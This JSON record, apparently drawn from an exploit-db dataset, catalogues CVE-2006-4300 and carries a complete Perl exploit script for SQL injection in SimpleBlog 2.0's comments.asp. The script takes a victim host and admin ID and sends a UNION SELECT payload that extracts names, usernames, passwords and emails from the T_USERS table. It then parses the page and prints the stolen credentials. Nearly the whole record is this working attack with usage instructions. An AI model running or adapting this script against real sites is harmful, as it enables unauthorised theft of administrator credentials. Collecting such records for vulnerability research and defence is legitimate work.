{
  "id": "2232",
  "title": "SimpleBlog 2.0 - &#039;comments.asp&#039; SQL Injection (2)",
  "cve": "CVE-2006-4300",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found by Chironex Fleckeri \r\n#Exploit By ASIANEAGLE\r\n#Contact:admin@asianeagle.org\r\n#Original advisory: http://www.milw0rm.com/exploits/2228\r\n#Usage: exploitname.pl <host> <path> <id>\r\nuse IO::Socket;\r\nif(@ARGV != 3) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \" *****SimpleBlog 2.0 SQL Injection Exploit***** \\r\\n\";\r\n  print \"      *****www.asianeagle.org***** \\r\\n\";\r\n  }\r\nsub usage() \r\n{\r\n  header();\r\n  print \" *Usage: $0 <host> <path> <id>\\r\\n\";\r\n  print \" *<host> = Victim's host ex: www.site.com\\r\\n\";\r\n  print \" *<path> = SimpleBlog Path ex: /SimpleBlog/\\r\\n\";\r\n  print \" *<id>   = Admin ID ex: 1\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  $simserver = $ARGV[0];\r\n  $simserver =~ s/(http:\\/\\/)//eg;\r\n  $simhost   = \"http://\".$simserver;\r\n  $simdir    = $ARGV[1];\r\n  $simport   = \"80\";\r\n  $simtar    = \"comments.asp?id=\";\r\n  $simsql    = \"-1%20UNION%20SELECT%20ID,uFULLNAME,uUSERNAME,uPASSWORD,uEMAIL,uDATECREATED,null,null%20FROM%20T_USERS%20WHERE%20id%20like%20\".$ARGV[2];\r\n  $simreq    = $simhost.$simdir.$simtar.$simsql;\r\n \r\n  header();\r\n  print \"- Trying to connect: $simserver\\r\\n\";\r\n  $sim = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$simserver\", PeerPort => \"$simport\") || die \"- Connection failed...\\n\";\r\n  print $sim \"GET $simreq HTTP/1.1\\n\";\r\n  print $sim \"Accept: */*\\n\";\r\n  print $sim \"Referer: $simhost\\n\";\r\n  print $sim \"Accept-Language: tr\\n\";\r\n  print $sim \"User-Agent: Mozzilla\\n\";\r\n  print $sim \"Cache-Control: no-cache\\n\";\r\n  print $sim \"Host: $simserver\\n\";\r\n  print $sim \"Connection: close\\n\\n\";\r\n  print \"Connected...\\r\\n\";\r\n  while ($answer = <$sim>) {\r\n    if ($answer =~ /class=\\\"c_content\\\">(.*?)<\\/td><\\/tr>/) { \r\n      if ($1 == $ARGV[2]) {\r\n        print \"Seems Vulnerable :)\\r\\n\";\r\n      }\r\n      else { die \"- Exploit failed\\n\"; }     \r\n    }\r\n    if ($answer =~ /class=\\\"c_content\\\"><b>(.*)<\\/b>/) {\r\n      print \"- Username: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ /href=\\\"mailto:(.*?)\\\">(.*?)<\\/a>/) {\r\n\t  print \"- Password: $1\\r\\n\";\r\n    }  \r\n  }\r\n  \r\n \r\n \r\n}\r\n\r\n# milw0rm.com [2006-08-20]",
  "url": "https://www.exploit-db.com/exploits/2232"
}